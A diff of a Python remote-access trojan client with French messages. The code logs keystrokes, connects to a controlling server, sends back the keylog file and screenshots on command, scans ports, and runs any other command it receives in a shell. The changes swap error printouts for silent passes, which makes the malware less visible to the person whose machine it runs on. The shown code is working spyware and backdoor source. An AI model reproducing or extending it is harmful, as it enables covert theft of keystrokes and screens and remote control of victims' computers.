@@ -33,8 +33,7 @@ def start_keylogger():
                     else:
                         pass
         except Exception as e:
-            print(f"Erreur de keylogger : {e}")
-
+            pass
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
@@ -50,6 +49,7 @@ def connect_to_server():
             if command.lower() == 'exit':
                 cs.send(b'quit')
                 break
+
             elif command.lower() == 'keylog':
                 try:
                     with open(keylog_file, "r") as f:
@@ -57,6 +57,7 @@ def connect_to_server():
                     cs.send(keylog_content.encode())
                 except FileNotFoundError:
                     cs.send(b"Keylog file not found.")
+
             elif command.lower() == 'screenshot':
                 screenshot = pyautogui.screenshot()
                 buffer = io.BytesIO()
@@ -68,6 +69,7 @@ def connect_to_server():
 
                 cs.sendall(buffer.getvalue())
                 continue
+
             elif command.startswith("scan"):
                 parts = command.split()
                 if len(parts) != 3:
@@ -78,6 +80,7 @@ def connect_to_server():
                 output = f"Ports ouverts sur {ip_address}: {open_ports}"
                 cs.send(output.encode())
                 continue
+
             else:
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
@@ -88,7 +91,6 @@ def connect_to_server():
                 cs.send(output.encode())
 
         except ConnectionResetError:
-            print("La connexion avec le serveur a été réinitialisée.")
             break
         except Exception as e:
             cs.send(f"Error: {e}".encode())
